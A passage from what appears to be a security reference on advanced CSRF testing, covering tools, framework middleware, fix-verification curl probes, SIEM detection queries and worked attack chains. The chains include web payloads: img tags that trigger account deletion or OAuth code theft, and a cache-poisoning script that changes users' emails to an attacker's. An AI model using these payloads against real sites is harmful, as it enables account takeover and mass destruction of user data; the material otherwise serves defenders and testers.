- **`csrfscanner`** — for automated CSRF-endpoint enumeration.

**Browser-driven confirmation:**

- **Custom Playwright / Puppeteer scripts** — for exact-browser CSRF confirmation, including Lax+POST window timing tests (must be within 120-second window from cookie refresh).
- **Selenium / WebdriverIO** — cross-browser testing matrix (Chrome / Firefox / Safari / Edge simultaneously).
- **BrowserStack / Sauce Labs** — cloud-hosted cross-browser matrix for CSRF reproduction.

**Traffic manipulation:**

- **Burp Suite Pro Repeater + Match/Replace** — for iterating on CSRF PoC HTML at scale.
- **`interactsh-client`** — OAST for confirming that a CSRF endpoint's server-side handler makes an outbound callback (webhook creation, notification dispatch).
- **`Caido`** — modern Burp alternative with CSRF testing modules.

**Framework-specific tools:**

- **Django's `test.Client`** for reproducing CSRF findings against a local Django target with the framework's own CSRF middleware active.
- **Spring's test framework** — similar for Spring Security CSRF testing.
- **ASP.NET Core's `WebApplicationFactory`** — for programmatic CSRF testing against AntiForgery middleware.

**SSE and streaming testing:**

- **`EventSource`-based test pages** — custom pages that open SSE connections with credentials to verify cross-origin behavior.
- **`ssestress`** — tool for stress-testing SSE endpoints; useful for identifying credentials-forwarding behavior at scale.

## Framework-Specific CSRF Middleware Depth

Beyond the base's Framework XML Handlers analogue, per-framework CSRF middleware depth:

**Django CSRF middleware:**

- `django.middleware.csrf.CsrfViewMiddleware` — the primary defense.
- Uses double-submit-cookie pattern with per-session token.
- Origin check added in Django 4.0+.
- Trusted origins list (`CSRF_TRUSTED_ORIGINS`) — misconfiguration risk if set too broadly.
- Token exemption via `@csrf_exempt` decorator — grep for uses and audit.

**Rails `protect_from_forgery`:**

- The technique-class CVE (Rails OTP-XOR) discussed in the novel sibling.
- Configurable behavior: `:exception`, `:null_session`, `:reset_session`.
- API-mode Rails disables it by default (`ActionController::API`).

**ASP.NET Core AntiForgery:**

- `IAntiforgery` service; requires explicit configuration.
- `[ValidateAntiForgeryToken]` attribute per action.
- Default cookie name `.AspNetCore.Antiforgery.*` — SameSite=Strict recommended.
- CVE-2025-55315 shows the middleware alone is not enough when smuggling is possible.

**Spring Security CSRF filter:**

- `CsrfFilter` in the security filter chain.
- Default enabled; can be disabled with `.csrf().disable()` (common misconfiguration in API-only apps).
- Token repository: cookie-based (Cookie-CsrfTokenRepository) or session-based (HttpSessionCsrfTokenRepository).
- Enforce with `.csrf(csrf -> csrf.csrfTokenRequestHandler(new XorCsrfTokenRequestAttributeHandler()))` in modern Spring Security.

**Symfony CSRF:**

- CSRF form-token generation via `csrf_token()` helper.
- Requires form-token verification on every state-change form submission.
- The `_token` field must be present and valid.

**Express (Node) — no built-in:**

- Community middleware: `csurf` (deprecated in 2022), `express-csrf-double-submit-cookie`, custom implementations.
- The lack of built-in CSRF is a common source of misconfiguration.
- Modern Express deployments increasingly use SameSite cookies + Origin check instead of token.

**Laravel CSRF:**

- `VerifyCsrfToken` middleware (default).
- Exemptions via `$except` array — audit for over-broad routes.
- Token in `_token` form field or `X-CSRF-TOKEN` header.

Each framework's exact behavior affects the attack surface; audit the specific configuration.

## Post-Fix Detection

Verifying a CSRF fix requires per-defense probing at every state-change endpoint. A fix at one endpoint may not extend to others.

**Middleware coverage audit:**

- Enumerate every state-change endpoint (POST/PUT/DELETE/PATCH, plus any GET that mutates state).
- For each, verify CSRF middleware is applied — by source review, or by black-box probing.
- Any endpoint that accepts a cross-origin state change without a token or Origin check is unprotected.
- Common gaps: legacy routes without the decorator; API routes with a separate authentication layer that assumes CSRF is handled elsewhere; internal admin routes accessible via an unauthenticated port.

**Per-defense verification:**

- **CSRF middleware coverage** — verify every state-change endpoint is protected. Missing middleware coverage is a gap. Test by sending an authenticated request without the CSRF token; observe rejection or acceptance.
- **Origin/Referer enforcement** — verify strict allowlist match, not substring or regex. Test with attacker-crafted Origin values: `https://evil.example.com.attacker.tld` (substring bypass), `Origin: null` (sandbox iframe), missing Origin header (fail-open test).
- **Token binding** — verify tokens are tied to session and user, rotate on privilege change. Test cross-user token reuse and cross-session token reuse.
- **SameSite explicitness** — verify session cookies use `SameSite=Strict` or `Lax` explicitly (not defaulted); explicit-Lax closes the Lax+POST window. Inspect `Set-Cookie` header.
- **Fetch Metadata middleware** — verify presence and correct check (`Sec-Fetch-Site: cross-site` rejection). Test with cross-site header values. Verify fail-closed on missing headers (many implementations fail-open).
- **Content-Type strictness** — verify JSON endpoints reject requests with non-JSON Content-Type. Test with `text/plain`, `multipart/form-data`, `application/octet-stream`.
- **WebSocket Origin allowlist** — verify strict allowlist at handshake. Test with attacker Origin.

**Concrete probe scripts:**

```bash
# CSRF middleware coverage probe
# Send state-change without CSRF token; observe rejection
curl -X POST "https://target/api/action" \
  -H "Cookie: session=<victim-session>" \
  -d "field=value"
# 403 or 200-with-error = protected; 200-with-state-change = unprotected.

# Origin enforcement probe  
curl -X POST "https://target/api/action" \
  -H "Cookie: session=<victim-session>" \
  -H "Origin: https://evil.example.com.attacker.tld" \
  -d "field=value"
# 403 = allowlist strict; 200 = substring-match or missing check.

# Fetch Metadata probe
curl -X POST "https://target/api/action" \
  -H "Cookie: session=<victim-session>" \
  -H "Sec-Fetch-Site: cross-site" \
  -H "Sec-Fetch-Mode: cors" \
  -H "Sec-Fetch-Dest: empty" \
  -d "field=value"
# 403 = Fetch Metadata enforced; 200 = missing check.
```

**Regression watch:**

- New routes added post-fix may miss the CSRF middleware; audit on every deployment.
- Middleware version upgrades may change defaults; verify after each upgrade.
- API versioning (`/api/v1/`, `/api/v2/`) may have different CSRF postures per version.

## Detection Signatures for Defenders

Defender-side detection for CSRF attempts:

**Signal shapes:**

- **Origin/Referer mismatches on state-change endpoints** — SIEM rule matching state-change routes where `Origin` doesn't match the app's own domain (allowing subdomain matches per your same-site scope).
- **Sudden spike in state-change requests from a single IP** — CSRF at scale produces a burst signal.
- **State-change endpoints hit without a preceding auth request** — CSRF sessions typically don't include a fresh login; the session was pre-existing. Anomaly.
- **Anti-forgery-token validation failures** — every framework's CSRF middleware logs the failure; spike on any of them is a CSRF-attempt signal.
- **Cross-origin WebSocket handshakes without Origin allowlist match** — CSWSH signature.

**SIEM query examples:**

```
# Cross-origin state-change spike
index=web_access method IN (POST, PUT, DELETE, PATCH)
  origin_header IS NOT NULL
  origin_header NOT LIKE "%.example.com"
| stats count by src_ip, uri
| where count > 100

# CSRF token validation failures
index=app_logs event_type="csrf_token_invalid"
| bin _time span=5m
| stats count by _time, uri
| where count > 20

# WebSocket handshake with unexpected Origin
index=web_access uri LIKE "%/ws" OR uri LIKE "%/socket"
  upgrade_header:websocket
  origin_header NOT LIKE "%.example.com"
| stats count by src_ip, uri, origin_header
```

**Compensating controls:**

- `SameSite=Strict` on session cookies where feasible.
- Fetch Metadata middleware enforcing `Sec-Fetch-Site: same-origin` for state-change endpoints.
- Anti-forgery-token with strict binding (per-session, per-user, per-endpoint).
- Origin allowlist enforcement on WebSocket handshakes.
- CORS `ACAO` strict allowlist (no wildcard with credentials).

## Advanced Composite Chain — Sibling XSS + Cache-Based CSRF → Mass Impact

Worked example:

1. Target: web app with a cacheable JSONP-style endpoint reflecting `?callback=X` into a cached response.
2. Attacker finds XSS on `blog.example.com` (sibling subdomain).
3. XSS payload injects `<script src="https://example.com/config.js?callback=</script><img src=/api/delete-account>"></script>`.
4. Every user visiting the blog triggers the cache poisoning attempt.
5. Blog is popular; cache is populated with the malicious content.
6. Every user requesting `/config.js` fetches the poisoned response; the embedded `<img>` triggers `/api/delete-account` with their credentials.
7. Mass account deletion across the userbase.

## Advanced Composite Chain — Fetch Metadata Middleware Bypass via Missing Route Coverage

Worked example:

1. Target: web app with Fetch Metadata middleware that rejects `Sec-Fetch-Site: cross-site` on state-change endpoints — but the middleware is applied via a Django decorator that some legacy routes don't inherit.
2. Attacker enumerates state-change endpoints: sends `Sec-Fetch-Site: cross-site` header to each; the middleware rejects most but accepts one legacy endpoint that lacks the decorator.
3. Attacker crafts CSRF PoC targeting the unprotected endpoint.
4. State change succeeds via the coverage-gap route.

## Advanced Composite Chain — OAuth CSRF + IDP-Trust Poisoning

Worked example:

1. Target: SaaS app supporting multiple OAuth IDPs (Google, GitHub, Microsoft).
2. Attacker registers an OAuth app on GitHub with malicious redirect_uri.
3. Attacker crafts CSRF to force victim through OAuth flow: `<img src="https://target/oauth/authorize?client_id=attacker_id&redirect_uri=attacker.tld&state=X&response_type=code">`.
4. Victim visits attacker page; image src is fetched; browser follows redirect chain; OAuth flow completes; authorization code returned to attacker.
5. Attacker exchanges code for victim's OAuth access token at their IDP.
6. Attacker uses token to access victim's identity, then links back to victim's app account.

## Testing Sequencing for Real Engagements

CSRF testing should be sequenced to minimize noise and match the target's exposure profile:

1. **Fingerprint session mechanism** — cookie / bearer / hybrid. If pure bearer, minimal CSRF surface.
2. **Enumerate state-change endpoints** — POST/PUT/DELETE/PATCH routes; GET routes with side effects.
3. **Test SameSite explicitness** — inspect `Set-Cookie` headers for `SameSite` attribute presence.
4. **Test Origin/Referer enforcement** — send state-change requests with attacker-controlled Origin; observe rejection or acceptance.
5. **Test token binding** — request the CSRF token as user A; use it in a request as user B; observe rejection or acceptance.
6. **Test method-override** — POST with `_method=DELETE` at every state-change endpoint.
7. **Test content-type variants** — JSON via text/plain, JSON via multipart.
8. **Test CSWSH** — for every WebSocket endpoint, verify Origin check.
9. **Test CORS misconfig** — for every state-change endpoint, check ACAO/ACAC.
10. **Test OAuth flows** — for every OAuth flow, verify state parameter presence and binding.
11. **Test SPA-specific paths** — for SPAs, distinguish cookie-based from bearer-based CSRF surface.

Sequence: read-only tests first (Origin check, token binding), destructive tests last (login CSRF, state changes). Between each destructive test, verify the target's state — a CSRF that succeeds may have observable side effects.

## Historical CSRF Class Recurrence

CSRF classes recur across ecosystems as new deployment shapes emerge:

**Recurrence patterns:**

- **Every new framework** re-implements CSRF middleware; many get it wrong initially. Django, Rails, ASP.NET, Spring have all had middleware bugs across their history.
- **Every new session mechanism** (bearer tokens, JWTs in cookies, WebAuthn) creates new CSRF considerations.
- **Every new transport** (WebSocket, HTTP/2, HTTP/3, WebTransport) introduces new handshake and per-connection trust boundaries.
- **Every new content-type** (`application/json`, `application/graphql`, `application/msgpack`) introduces new parser-differential opportunities.
- **Every new browser feature** (Fetch, EventSource, WebSocket, WebTransport) creates new preflight and credential-forwarding behaviors.

**Historical class summary:**

- **Early 2000s** — CSRF as a class first documented (Zeller & Felten, "Cross-Site Request Forgeries: Exploitation and Prevention", 2008).
- **2010s** — SameSite cookie attribute proposed and rolled out.
- **2020** — Chrome default SameSite=Lax; CSRF class narrowed for cookie-based defenses.
- **2021** — Fetch Metadata proposal; new defender surface.
- **2022** — SPA and API-first apps re-introduce CSRF via bearer/cookie hybrids.
- **2024–2025** — Multiple CSRF-adjacent CVEs in Spring, ASP.NET Core; SSE-CSRF as new class.
- **RFC 9700 (Jan 2025)** — OAuth state/PKCE upgraded to MUST.

**Prediction:**

- Expect CSRF-adjacent CVEs to continue at 5-10 per year across major frameworks.
- Expect new class expressions as HTTP/3 and WebTransport mature.
- Expect Fetch Metadata middleware to eventually ship as framework default (currently community-tier per Batch-7 research).

## Composite Chain — Fetch Metadata Coverage Gap + Method Override → State Change

Worked example:

1. Target: web app with Fetch Metadata middleware applied via decorator; most routes protected.
2. Legacy route `/api/legacy-action` lacks the decorator.
3. Attacker sends `<img src="https://target/api/legacy-action?_method=DELETE&user=victim">`.
4. Browser fetches URL with SameSite-Lax cookie; server accepts GET + method-override; DELETE fires.
5. Chain: Fetch Metadata coverage gap + method-override → CSRF.

## Composite Chain — Cache-Based CSRF Delivery to All Users

Worked example:

1. Target: web app with public cached endpoint `/config.js` reflecting `?callback=X`.
2. Attacker requests `/config.js?callback=</script><script>fetch("/api/change-email",{method:"POST",credentials:"include",body:"email=attacker@evil"})</script>`.
3. Response cached with the malicious content.
4. All users fetching `/config.js` get the poisoned response; their browsers execute the script; email changes to attacker's.
5. Chain: cache poisoning → CSRF delivery → mass account takeover.

## Summary

Advanced CSRF depth is about the specific delivery vector, the specific parser behavior at the target endpoint, and the specific defense that's misconfigured or missing. Sub-resource CSRF extends the delivery vector beyond forms; JSON-endpoint CSRF exploits content-type manipulation; CSWSH exploits WebSocket handshake trust; CORS-relaxed CSRF turns write-only into read-write; OAuth flow abuse exploits state-parameter weakness; cache-based CSRF turns write access to a cache into mass CSRF delivery; SPA-specific and mobile/WebView CSRF exploit newer deployment shapes. Match the vector to the target's specific configuration; confirm across browser matrix; and route composite chains to sibling skills for downstream impact.
